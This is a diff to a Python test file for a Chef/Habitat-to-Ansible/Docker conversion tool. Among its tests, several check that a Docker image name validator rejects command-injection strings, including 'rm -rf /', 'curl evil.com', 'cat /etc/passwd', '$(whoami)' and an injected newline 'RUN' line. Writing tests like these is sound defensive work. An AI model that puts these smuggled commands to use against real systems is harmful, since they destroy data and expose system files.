@@ -10496,7 +10496,7 @@ class TestErrorHandling:
         """Test Chef block with File.exist? check."""
         block = "File.exist?('/etc/nginx/nginx.conf')"
         result = _convert_chef_block_to_ansible(block, positive=True)
-        assert "test -f" in result
+        assert "is file" in result
         assert "/etc/nginx/nginx.conf" in result
 
     def test_convert_chef_block_file_exist_negated(self):
@@ -10504,14 +10504,14 @@ class TestErrorHandling:
         block = "File.exist?('/etc/config')"
         result = _convert_chef_block_to_ansible(block, positive=False)
         assert "not" in result
-        assert "test -f" in result
+        assert "is file" in result
         assert "/etc/config" in result
 
     def test_convert_chef_block_directory(self):
         """Test Chef block with File.directory? check."""
         block = "File.directory?('/var/log')"
         result = _convert_chef_block_to_ansible(block, positive=True)
-        assert "test -d" in result
+        assert "is directory" in result
         assert "/var/log" in result
 
     def test_convert_chef_block_system_command(self):
@@ -13204,6 +13204,25 @@ pkg_maintainer='Test User'
         assert _extract_plan_var(content, "pkg_maintainer") == "Test User"
         assert _extract_plan_var(content, "pkg_nonexistent") == ""
 
+    def test_extract_plan_var_with_escaped_quotes(self):
+        """Test extracting variables with escaped quotes from Habitat plan."""
+        content = """
+pkg_maintainer="Team \\"SousChef\\""
+pkg_description='It\\'s a great tool'
+pkg_comment=# This is a comment
+pkg_value=something  # inline comment
+"""
+        from souschef.server import _extract_plan_var
+
+        # Test escaped double quotes
+        assert _extract_plan_var(content, "pkg_maintainer") == 'Team \\"SousChef\\"'
+        # Test escaped single quotes
+        assert _extract_plan_var(content, "pkg_description") == "It\\'s a great tool"
+        # Test that commented lines are skipped
+        assert _extract_plan_var(content, "pkg_comment") == ""
+        # Test that inline comments are not included
+        assert _extract_plan_var(content, "pkg_value") == "something"
+
     def test_extract_plan_array(self):
         """Test extracting arrays from Habitat plan."""
         content = """
@@ -13399,25 +13418,90 @@ do_install() {
         }
         assert _needs_data_volume(plan_postgres) is True
 
-        plan_mysql = {
-            "package": {"name": "mysql"},
-            "callbacks": {},
-        }
-        assert _needs_data_volume(plan_mysql) is True
+    def test_validate_docker_image_name_valid(self):
+        """Test validation of valid Docker image names."""
+        from souschef.server import _validate_docker_image_name
 
-        # Should not detect volume need for simple service
-        plan_simple = {
-            "package": {"name": "nginx"},
-            "callbacks": {},
-        }
-        assert _needs_data_volume(plan_simple) is False
+        # Standard images
+        assert _validate_docker_image_name("ubuntu:22.04") is True
+        assert _validate_docker_image_name("nginx:latest") is True
+        assert _validate_docker_image_name("alpine:3.18") is True
 
-        # Should detect pgdata in init callback
-        plan_pgdata = {
-            "package": {"name": "app"},
-            "callbacks": {"do_init": "mkdir -p /pgdata/db"},
-        }
-        assert _needs_data_volume(plan_pgdata) is True
+        # With registry
+        assert _validate_docker_image_name("docker.io/library/ubuntu:22.04") is True
+        assert _validate_docker_image_name("gcr.io/my-project/app:v1.0") is True
+        assert _validate_docker_image_name("myregistry.com:5000/app:latest") is True
+
+        # Without tag (implicitly latest)
+        assert _validate_docker_image_name("ubuntu") is True
+        assert _validate_docker_image_name("nginx") is True
+
+        # With digest
+        assert (
+            _validate_docker_image_name(
+                "ubuntu@sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+            )
+            is True
+        )
+
+        # Complex valid names
+        assert _validate_docker_image_name("my-app.test_123:v1.2.3-alpha") is True
+
+    def test_validate_docker_image_name_invalid(self):
+        """Test validation rejects invalid Docker image names."""
+        from souschef.server import _validate_docker_image_name
+
+        # Injection attempts
+        assert _validate_docker_image_name("ubuntu:22.04; rm -rf /") is False
+        assert _validate_docker_image_name("ubuntu:22.04\nRUN malicious") is False
+        assert _validate_docker_image_name("ubuntu:22.04 && curl evil.com") is False
+
+        # Shell metacharacters
+        assert _validate_docker_image_name("ubuntu|cat /etc/passwd") is False
+        assert _validate_docker_image_name("ubuntu$(whoami)") is False
+        assert _validate_docker_image_name("ubuntu`id`") is False
+        assert _validate_docker_image_name("ubuntu>output.txt") is False
+
+        # Invalid formats
+        assert _validate_docker_image_name("") is False
+        assert _validate_docker_image_name(None) is False  # type: ignore[arg-type]
+        assert _validate_docker_image_name(123) is False  # type: ignore[arg-type]
+
+        # Too long
+        assert _validate_docker_image_name("a" * 300) is False
+
+    def test_convert_habitat_to_dockerfile_invalid_base_image(self):
+        """Test Dockerfile conversion rejects invalid base image names."""
+        with patch("souschef.server.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {"name": "nginx", "origin": "core"},
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {},
+                    "callbacks": {},
+                }
+            )
+
+            # Injection attempt with newline
+            result = convert_habitat_to_dockerfile(
+                "/fake/plan.sh", "ubuntu:22.04\nRUN malicious"
+            )
+            assert "Error" in result
+            assert "Invalid Docker image name" in result
+
+            # Injection attempt with semicolon
+            result = convert_habitat_to_dockerfile(
+                "/fake/plan.sh", "ubuntu:22.04; rm -rf /"
+            )
+            assert "Error" in result
+            assert "Invalid Docker image name" in result
+
+            # Shell command injection
+            result = convert_habitat_to_dockerfile("/fake/plan.sh", "ubuntu$(whoami)")
+            assert "Error" in result
+            assert "Invalid Docker image name" in result
 
     def test_generate_compose_from_habitat_single_service(self):
         """Test generating docker-compose.yml from a single Habitat plan."""
